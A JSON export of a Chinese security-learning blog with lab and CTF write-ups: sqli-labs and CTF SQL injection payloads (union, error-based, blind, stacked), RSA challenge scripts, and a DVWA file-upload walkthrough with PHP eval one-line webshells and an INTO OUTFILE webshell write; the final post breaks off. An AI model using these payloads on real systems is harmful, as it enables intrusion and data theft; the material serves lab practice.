{"meta":{"title":"释","subtitle":"","description":"","author":null,"url":"https://ZC1109.github.io","root":"/"},"pages":[],"posts":[{"title":"sqli-labs闯关1_4","slug":"sqli-labs闯关1_4","date":"2020-10-16T03:36:11.306Z","updated":"2020-10-16T03:36:10.077Z","comments":true,"path":"2020/10/16/sqli-labs闯关1_4/","link":"","permalink":"https://zc1109.github.io/2020/10/16/sqli-labs%E9%97%AF%E5%85%B31_4/","excerpt":"LESS–1（错误型GET单引号字符型注入）","text":"LESS–1（错误型GET单引号字符型注入） 1.测试闭合符号；输入 ?id=1 界面正常，输入?id=1’ 界面报错，那么就存在sql注入漏洞。2.判断列数；输入 ?id=1’ order by 3 –+ 显示正常输入 ?id=1’ order by 4 –+ 报错了，如下图：所以得出这个表列数有3个。3.联合查询爆数据库union注入开始： ?id=-1’ union select 1,2,3 –+ 得到数据库security ： ?id=-1’ union select 1,database(),3 –+ database()放在2或者3的位置都可以4.爆数据表?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+ 5.爆字段?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+6.爆数据值?id=-1’ union select 1,group_concat(username,0x3a,password),3 from users –+小结：1.group_concat():是字符串连接函数。2.0x3a:是十六进制下的冒号。3.database():列出数据库名。LESS–2错误型get整型注入1.判断注入点和列数因为是整型注入需要在注入的时候的时候需要把 ‘ 去掉。这里就不再重复步骤了嘻嘻！！！LESS–31.这关还是闭合符号变了闭合符号是 ‘)个人感觉前几关只要闭合符号测试出来，就没什么其他的难度了hhhhhh LESS–4经过测试，判断出闭合符号是 “) 再判断列数，爆数据库，爆数据表，爆字段，爆值。","categories":[],"tags":[]},{"title":"【强网杯2019】随便注","slug":"【强网杯2019】随便注","date":"2020-10-16T03:35:51.819Z","updated":"2020-10-16T03:35:50.416Z","comments":true,"path":"2020/10/16/【强网杯2019】随便注/","link":"","permalink":"https://zc1109.github.io/2020/10/16/%E3%80%90%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E3%80%91%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"题目：","text":"题目： ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200910202423676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTI3ODE5,size_16,color_FFFFFF,t_70#pic_center) 由题目信息可得出，采用SQL注入； 首先判断闭合符号，输入1’ 发现报错了，用#截断 那么存在注入漏洞，接下来查询字段数，1’ order by 3#发现报错了 1’ order by 2#则显示正常，那么字段数为两个；联合查询：1’ union select 1,2#select，update，…….都被过滤掉了；堆叠注入：又叫多语句注入,就是原本只执行一个sql句,用函数让他可以执行多个sql语句。我们继续查询数据库：1’;show databases;#接下来查询字段 此时发现存在‘1919810931114514’和‘words’这两个字段。 查询这两个字段中的列名： 1’; show columns form ‘words’ 1’; show columns form 1919810931114514 这里要注意使用反引号。 发现words里边存在id 和data，flag则在1919810931114514里边，但没法显示出来；（我们要的东西都在words中回显出来了）即我们若想得到flag，就需要：（1）将字段words换为其他的，如word1（2）将字段1919810931114514换为words（3）将列名flag换为id需要使用alter，rename等关键字, 如下： 1’ ; rename tables words to word1 ; rename tables 1919810931114514 to words ; alter table words change flag id varchar(100);# 这样就改变了数据库结构， 1’ or 1=1# 得到flag{37c18514-62c1-4d17-b3e9-72e9876d7d6f} 本题涉及了rename ， alter ，这两个关键字： rename：重命名 alter：变更列 对数据库结构改变的简单语句： CREATE DATABASE - 创建新数据库 ALTER DATABASE - 修改数据库 CREATE TABLE - 创建新表ALTER TABLE - 变更（改变）数据库表DROP TABLE - 删除表CREATE INDEX - 创建索引（搜索键）DROP INDEX - 删除索引","categories":[],"tags":[]},{"title":"【极客大挑战2019LoveSQL】","slug":"【极客大挑战2019LoveSQL】","date":"2020-10-16T03:35:22.452Z","updated":"2020-10-16T03:35:21.195Z","comments":true,"path":"2020/10/16/【极客大挑战2019LoveSQL】/","link":"","permalink":"https://zc1109.github.io/2020/10/16/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL%E3%80%91/","excerpt":"题目地址：http://b7f87fb9-2d9b-47f3-8c81-31d54bda9fe7.node3.buuoj.cn","text":"题目地址：http://b7f87fb9-2d9b-47f3-8c81-31d54bda9fe7.node3.buuoj.cn 看到需要账户和密码直接采用万能钥匙来试一下。 admin’ or 1=1# 密码随便填就可以 登陆成功了判断列数： 1&gt; &#x2F;check.php ?username&#x3D;1&#39; order by 3%23&amp;password&#x3D;1 没有报错，只是账户密码错误 当到order by 4 时报错了所以判断出有三个列数。联合查询爆数据库 12&#x2F;check.php?username&#x3D;1&#39;union select 1,2,database()%23&amp;password&#x3D;1 找到数据库名 ‘geek’。爆数据表 12&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;1 得到两个表名：&#39;geekuser&#39;,&#39;l0ve1ysq1’爆字段名： 12&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1 爆值 12&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;1 flag就在里边了！总结：这道题其实并不难，我画了一个简图如下：","categories":[],"tags":[]},{"title":"RSA密码的原理及做题总结","slug":"RSA密码的原理及做题总结","date":"2020-10-16T03:35:08.343Z","updated":"2020-10-16T03:35:07.060Z","comments":true,"path":"2020/10/16/RSA密码的原理及做题总结/","link":"","permalink":"https://zc1109.github.io/2020/10/16/RSA%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"@[TOC] RSA算法：是应用最广泛的公钥密码算法","text":"@[TOC] RSA算法：是应用最广泛的公钥密码算法 RSA算法步骤：1.随计选择两个不相等的质数p，q2.计算它们的乘积N=pq3.计算欧拉函数*φ(N)=(p-1)(q-1)，N的二进制长度作为密钥的长度，4.随机选择一个加密密钥e,这里1&lt;e&lt;φ(N), gcd(e,φ(N))=1，即e与φ(N)互质。5.根据以下公式求解得到解密密钥d**ed=1 mod φ(N)，0≤d≤N6.发布加密密钥：(e,N)7.保密解密密钥：(d,N) 这里的n就是N！！！！ 这张图是我偷别人的哈哈哈哈哈！！！！！！！！我们来简单计算一下吧：已知p=3，q=11。计算N: 1N&#x3D;P*Q&#x3D;33 欧拉函数： 1φ(N)&#x3D;（p-1）*（q-1）&#x3D;20 计算公钥e： 11&lt;e&lt;φ(N),即1&lt;e&lt;20,那么我们取最小值e&#x3D;3，（e要与φ(N)互质) 计算私钥d： 123e*d%φ(N)&#x3D;13*d%φ(N)&#x3D;1那么d&#x3D; 7 公钥加密我们来加密M=2C=M^e mod N 1234M&#x3D;2e&#x3D;3N&#x3D;33C&#x3D;2^3 %33&#x3D;8 经过RSA加密后M就变成了8.私钥解密M=C^d mod N 1234C&#x3D;8D&#x3D;7N&#x3D;33M&#x3D;8^7 %33&#x3D;2 我们学习RSA不可能去手算，因此我们需要自己编写脚本！ 安装python的gmpy2第三方库：我是在windows下安装的，比较简单方便，当然要先安装python，以及环境配置。python直接去官网安装就可以了，然后我们选择适合自己python版本的gmpy去安装，这个网站就很棒！！！我们把安装好的wheel放在python文件夹下的scripts里边，打开命令函，win+r，输入cmd，cd到这个文件夹下，输入pip install gmpy****稍等一会就安装好了；检查一下是否安装成功：pip list 这样就可以了!!! 下面让我们来练练手吧！ 【BUUCTF-Crypto】RSA 由题意可知：p，q，e，求d直接上脚本: 123456import gmpy2p &#x3D; 473398607161q &#x3D; 4511491e &#x3D; 17d &#x3D; gmpy2.invert(e,(p-1)*(q-1))print (d) flag{125631357777427553} 【BUUCTF-Crypto】rsarsa已知p,q,e,c,求m即可，根据公式m=pow（c,d,n）；直接上脚本： 1234567891011121314import gmpy2def Decrypt(c,e,p,q): L&#x3D;(p-1)*(q-1) d&#x3D;gmpy2.invert(e,L) n&#x3D;p*q m&#x3D;gmpy2.powmod(c,d,n) flag&#x3D;str(m) print(&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e &#x3D; 65537 c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Decrypt(c,e,p,q) if name == ‘main‘:一个python文件通常有两种使用方法，第一是作为脚本直接执行，第二是 import 到其他的 python 脚本中被调用（模块重用）执行。因此 if name == ‘main’: 的作用就是控制这两种情况执行代码的过程，在 if name == ‘main’: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。pow(x,y,z) 这个是表示x 的y 次幂后除以z的余数即： 1pow（x,y,z）&#x3D;x^y%z 【BUUCTF-Crypto】RSA1 12dp&#x3D;d%(p-1)dq&#x3D;d%(q-1) 123456789101112131415import gmpy2import libnumdef decrypt(dp,dq,p,q,c): InvQ &#x3D; gmpy2.invert(q, p) mp &#x3D; pow(c, dp, p) mq &#x3D; pow(c, dq, q) m &#x3D; (((mp-mq)*InvQ) % p)*q+mq print (libnum.n2s(m))p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) 这里提醒一下，我们还需要安装libnum这个库。跑一下脚本：noxCTF{W31c0m3_70_Ch1n470wn}，这便是flag！ 【BUUCTF-Crypto】RSA2 1234567891011121314151617181920212223import gmpy2 as gpe &#x3D; 65537n &#x3D; gp.mpz(248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113)dp &#x3D; gp.mpz(905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657)c &#x3D; gp.mpz(140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751)for x in range(1, e): if(e*dp%x&#x3D;&#x3D;1): p&#x3D;(e*dp-1)&#x2F;&#x2F;x+1 if(n%p!&#x3D;0): continue q&#x3D;n&#x2F;&#x2F;p phin&#x3D;(p-1)*(q-1) d&#x3D;gp.invert(e, phin) m&#x3D;gp.powmod(c, d, n) if(len(hex(m)[2:])%2&#x3D;&#x3D;1): continue print(&#39;--------------&#39;) print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) 我是脚本收集者！flag{wow_leaking_dp_breaks_rsa?_98924743502}","categories":[],"tags":[]},{"title":"Sqli-labs第5_8关详解","slug":"Sqli-labs第5_8关详解","date":"2020-10-16T03:34:46.569Z","updated":"2020-10-16T03:34:44.959Z","comments":true,"path":"2020/10/16/Sqli-labs第5_8关详解/","link":"","permalink":"https://zc1109.github.io/2020/10/16/Sqli-labs%E7%AC%AC5_8%E5%85%B3%E8%AF%A6%E8%A7%A3/","excerpt":"@[TOC] 第五关当输入?id=1时显示下面的页面","text":"@[TOC] 第五关当输入?id=1时显示下面的页面 当输入?id=1&#39;时显示异常 页面没有显示位。无法使用联合查询注入。显示位的解释：在一个网站正常的界面，服务端执行Sql语句查询数据库中的数据，客户端会将数据显示在页面中，这个显示数据的位置就叫做显示位。如： 报错注入什么是报错注入呢？ 报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。0x7e=’~’ 首先介绍三种报错注入常用的语句： (1). 通过floor报错 and (select 1 from (selectcount(),concat(( payload),floor (rand(0)2))x frominformation_schema.tables group by x)a) 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 (2). 通过updatexml报错 and updatexml(1, payload,1)同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。这些是我参考大佬的博客所得到的 floor报错语句注入：1234567?id&#x3D;1&#39; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id&#x3D;1&#39; union select count(*),1, concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id&#x3D;-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+?id&#x3D;-1&#39; and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 爆数据库 1?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 爆数据表 1?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 这里发现页面提示我输出信息超过一行，但我们已经使用了group_concat函数，说明这里数据库名组成的字符串长度超过了64位，所以我们需要放弃group_concat函数，而使用limit 0,1来一个个输出。 1?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 这里我们改变limit 的条件就可以了，爆出了users 爆列名（字段） 1?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 爆数据值 1?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(username,0x3a,password) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 我们要不断改变limit的条件来找到我们想要的值！ extractvalue函数进行报错注入可以理解为，让后台xml故意报错。利用这种方式我们对后台进行一个排序，指定第一个参数为null，让它故意报错，将第二个参数的语句带入数据库执行，最后报错显示执行的结果。id=1 and 123456789爆数据库?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,database(),0x7e))--+爆表名?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x23))--+爆列名（字段）?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 1,1),0x23))--+爆值?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+这里也需要不断改变limit的条件，找到我们想要的表名，字段名！ 第六关闭合符号为双引号，其他均与第五关相同。 第七关导出文件GET字符型注入 导出文件1、LOAD_FILE 可以利用该函数，进写入shell 用法：select load_file(‘file1’) into outfile ‘file2’将file1的文件导入WEB目录file2的文件中进行访问。2、 另外要保证正常的文件写入与读取要在mysql目录找到my.in这个文件，最后一行新增secure_file_priv= “ “方法，才能使用LOAD_FILE在生产环境情况下。3、导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面。常用的语句是： select ““ into outfile “XXX\\test.php” 手打路径真的很麻烦，随便找个简单关测试出路径 1?id&#x3D;-1 union select 1,@@basedir,@@datadir --+ payload 1?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;ZC&quot;]);?&gt;&#39; into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\ZC.php&quot;--+ 虽然回显报错了，但是在D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\下应该有我们所创建的ZC.php如果没有找到，那么我们就需要改动C:\\phpStudy\\PHPTutorial\\MySQL下的my.ini添加secure-file-prive=””,保存，重启mysql )打开 第八关关于burpsuite抓不到本地包的问题这里我们以firefox为例：首先我们配置burp的代理：Proxy&gt;&gt;options add 本机ip：127.0.0.1和端口号：8080 我们打开firefox浏览器，配置代理设置： 一定要选择手动配置代理，按下图操作。然后我们在FoxyProxy 新建代理服务器，添加本机地址和端口号 工作模式选择：为全部URLs启动代理服务器“127.0.0.1：8080” 这样问题就解决了 布尔盲注1.布尔盲注利用前提：页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。2.注入原理：注入的时候只会返回True和False，所以布尔盲注就是根据页面显示的是True还是False进行猜测数据库中的信息。3.布尔盲注过程：sqli-labs-master/Less-8 进入正题：首先判断闭合符号（是否存在注入点） 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1 发现没有回显位。当输入?id=1&#39;报错了，但加上注释符号（%23）又显示正常； 爆破数据库爆数据库长度： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&gt;1 --+ 手工爆破的话就需要不断增加长度，最后得出数据库的长度是8 ascii码爆破数据库名1Less-8&#x2F;?id&#x3D;1&#39; and ord(substr(database(),1,1))&gt;99 --+ 1Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((database()),1,1)) &gt; 99 --+ 1Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((database()),1,1)) &#x3D; 99 --+ 取出数据库名中的一个字符通过比较ascii码来猜测出数据库名，但是如果手动爆的话太浪费时间了，可以用burp爆破，也可以写脚本。burp爆破：先构造好注入语句 1?id&#x3D;1&#39; and ascii(substr((database()),1,1)) &#x3D; 115 --+ 下图是设置好的；直接开始攻击 把这些ascii码拿去转换一下得到数据库的名字：security left函数 爆破数据库名：这里我们要用到left函数 1?id&#x3D;1&#39; and left(database(),1)&#x3D;&#39;s&#39; --+ 这个语句的意思就是测试数据库名的第一个字符是否为‘s’。下面我们来试一下： 回显正确，证明数据库名称的第一个字母为‘s’那我我们是不是也可以用burpsuite对其进行一个爆破呢？没错构建注入语句 1?id&#x3D;1&#39; and left(database(),1)&#x3D;&#39;a&#39; --+ 我们需要在桌面写一个字典：a~z 进行爆破抓到包之后send to intruder 将’a’设为参数，payload type选择Runtime file，选择我们写好的字典。 爆破开始我们手工的时候就发现第一个字母是s了，这里只是为了演示一下，继续： 这里需要把之前的数字1改为2，另外参数a前也要加上s进行攻击，我们就会发现第二个字符是e，依次类推，便得出数据库的名了：security.注意：必须递进，依次去获取每一位，也就是说当我们爆破第三位的时候，’2’就需要改为’3’，而参数a前就需要加上se，类推。 ascii爆破数据表名 1?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101)--+ 爆破发现第一个表的第一位的ascii码是101，也就是字母e，那么和爆数据库名的时候一样，需要改变limit的值，以此类推，可以找到所有的表。 爆列名（字段） 1?id&#x3D;1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;97--+ 爆数据值 1?id&#x3D;1&#39; and (ascii(substr(( select username from users limit 0,1),1,1)))&gt;65--+ 1?id&#x3D;1&#39; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;65--+","categories":[],"tags":[]},{"title":"DVWA的搭建以及文件上传漏洞各个等级测试","slug":"DVWA的搭建以及文件上传漏洞各个等级测试","date":"2020-10-16T03:34:12.239Z","updated":"2020-10-16T03:34:08.965Z","comments":true,"path":"2020/10/16/DVWA的搭建以及文件上传漏洞各个等级测试/","link":"","permalink":"https://zc1109.github.io/2020/10/16/DVWA%E7%9A%84%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%90%84%E4%B8%AA%E7%AD%89%E7%BA%A7%E6%B5%8B%E8%AF%95/","excerpt":"@[TOC] DVWA的安装环境phpstudy 集成了PHP、MySQL、php-mysql等应用或组件。用起来十分方便。（这里就不详细介绍phpstudy的安装教程了）","text":"@[TOC] DVWA的安装环境phpstudy 集成了PHP、MySQL、php-mysql等应用或组件。用起来十分方便。（这里就不详细介绍phpstudy的安装教程了） 下载DVWADVWA下载地址将其安装包放在phpstudy的www目录下，找到config.inc.php.dist 并粘贴里边的内容，创建一个新的php文件config.inc.php我是已经创建好的。用记事本打开config.inc.php 文件修改以下内容：$_DVWA[ ‘db_password’ ] = ‘p@ssw0rd’; 将引号里面的p@ssw0rd改成 root 保存后打开电脑浏览器 地址栏输入127.0.0.1/DVWA-master/ 按下回车，然后点击网页底下的 Create/Reset Database 按钮会跳转到登录页面默认账号：admin密码：password输入后按回车进入总体安装起来是非常简单的 DVWA——File UploadFile Upload，即文件上传漏洞， 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 自我感受当我在bilibili上面看大师傅们的演示真的令我十分震撼，哈哈哈哈也可能是因为我太菜了吧！获取服务器的WebShell权限来查看/上传/下载对方文件，查看数据库信息，执行命令，甚至恶搞等等，可以说是能够执行任意操作，实在是厉害，自愧不如。 风险点 ·注册/修改个人信息处（上传头像）·敏感身份认证处（身份证照片/银行卡照片/个人照片……）【多为·金融/借贷应用】·订单评价反馈处（上传商品照片）【淘宝/京东……】·朋友圈/空间·所有能上传操作的地方 文件上传漏洞的利用是有限制条件：一、能够成功上传木马文件二、上传文件必须能够被执行三、上传文件的路径必须可知 Low级别测试源码：DVWA_WEB_PAGE_TO_ROOT为网页的根目录target_path变量为上传文件的绝对路径basename( $_FILES[&#39;uploaded&#39;][&#39;name&#39;])将文件中已经uploaded的文件的名字取出并加入到target_path变量中。if语句判断文件是否上传到指定的路径中，若没有则显示没有上传。服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。此级别没有对上传文件的类型进行任何的过滤，也就是可以随意上传php文件。构造一句话木马 1&lt;?php @eval($_POST[&#39;A&#39;]);?&gt; 这个便是我们上传文件的部分路径打开蚁剑，添加数据:连接成功，打开便可以看到以下界面。 medium级别测试源码：可以对比出来中级的多了限制条件，只能传JPEG或者png图片并且还有大小限制。 那么我们就通过抓包，将type类型改为image/jpeg。上传文件抓包：然后点击forward，回到靶场，发现上传成功：打开蚁剑，添加数据，连接，成功 High级别测试源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; &#x2F;&#x2F; Where are we going to be writing to? $target_path &#x3D; DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&#x2F;uploads&#x2F;&quot;; $target_path .&#x3D; basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); &#x2F;&#x2F; File information $uploaded_name &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext &#x3D; substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_tmp &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; &#x2F;&#x2F; Is it an image? if( ( strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;jpg&quot; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;jpeg&quot; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; &#x2F;&#x2F; Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; &#x2F;&#x2F; No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;&#x2F;pre&gt;&#39;; &#125; else &#123; &#x2F;&#x2F; Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;&#x2F;pre&gt;&quot;; &#125; &#125; else &#123; &#x2F;&#x2F; Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;&#x2F;pre&gt;&#39;; &#125;&#125;?&gt; 函数解析 strrpos(string,find,start)strrpos()函数查找.出现在 $ uploaded_name的位置然后加1，再利用substr()函数从变量$uploaded_name的指定位置截取部分字符串。所以这段代码的作用就是为了截取上传文件的后缀名. strtolower()将无论是大写或小写的后缀名全改为小写，以防大小写绕过 getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。可以看到，High级别的代码读取文件名中最后一个“.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。 制作一句话图片木马上传图片： 绕过成功，但我通过蚁剑却连接不上，经过查找资料最后发现需要进行php代码解析，就是将自己的上传的文件（无论是什么类型的文件）以php代码执行；下面我来补充一下使用蚁剑进行high等级shell连接： 还是需要制作一句话图片木马，上文已经讲过了，这里我就不再多说3.jpg就是我所使用1.jpg和2.php制作的一句话木马；然后需要编写一个include()php代码关于include的用法 1234&lt;?php$a&#x3D;$_GET[&#39;id&#39;];include($a)?&gt; 命名为a.php,接下来就通过文件包含(a.php来包含我们所制作的的一句话木马图片，也就是3.jpg)来使用蚁剑连接： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;a.php?id&#x3D;3.jpg 连接成功！！！！！！","categories":[],"tags":[]},{"title":"kail连接Xshell以及windows与kali服务端文件互传","slug":"kail连接Xshell以及windows与kali服务端文件互传","date":"2020-10-16T03:33:22.191Z","updated":"2020-10-16T03:33:20.230Z","comments":true,"path":"2020/10/16/kail连接Xshell以及windows与kali服务端文件互传/","link":"","permalink":"https://zc1109.github.io/2020/10/16/kail%E8%BF%9E%E6%8E%A5Xshell%E4%BB%A5%E5%8F%8Awindows%E4%B8%8Ekali%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E4%BA%92%E4%BC%A0/","excerpt":"@[TOC] kali与Xshell建立连接","text":"@[TOC] kali与Xshell建立连接 首先打开kali终端，输入命令： 1vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改结果如下图然后我们需要打开ssh：看到状态为running即可接下来打开Xshell，新建一个文件：名称为虚拟机名称即可，主机就填写自己虚拟机服务端的ip地址，端口号不需要改变。点击确定，输入虚拟机用户名及密码就连接成功了。 windows与kali服务端文件互传windows文件上传至kali：输入命令：apt install lrzsz下面开始传递文件： 1rz 输入rz后点击需要上传的文件即可，我选择的是2.png，上传成功后我们来看看kali中是否存在。在主文件夹中找到了2.pngkali文件上传至windows： 1sz 我是将2.png上传至桌面，上传成功。 rz:用于将windows文件上传到kali中sz:用于将kali文件上传到windows中；sz后跟需要上传的文件名 连接Xshell时遇到的问题：结果第二天却发现Xshell不能连接虚拟机了，连了几次放弃了，继续查百度，最后发现原来是没有设置服务开机自动启动，按照上面的步骤启动ssh服务后，在终端输入update-rc.d ssh enable即可，继续打开Xshell建立文件，配置IP和账户就可以连接成功！！","categories":[],"tags":[]},{"title":"了解PHP序列化与反序列化(1)","slug":"了解PHP序列化与反序列化(1)","date":"2020-05-13T08:19:32.808Z","updated":"2020-05-13T08:19:27.475Z","comments":true,"path":"2020/05/13/了解PHP序列化与反序列化(1)/","link":"","permalink":"https://zc1109.github.io/2020/05/13/%E4%BA%86%E8%A7%A3PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)/","excerpt":"序列化是将变量转百换为可保存或传输的字符串的过程；","text":"序列化是将变量转百换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程度序更具维护性。PHP中的序列化和反序列化分别通过函数serialize()和unserialize()即可实现。serialize()的参数可以是resource类型外的所有变量类型，最常见的是用来序列化对象，unseialize()将属serialize的返回结果作为参数，进行反序列化，得到原对象。简单一点来说php使用serialize这个过程被称为序列化，使用unserialize这个过程被称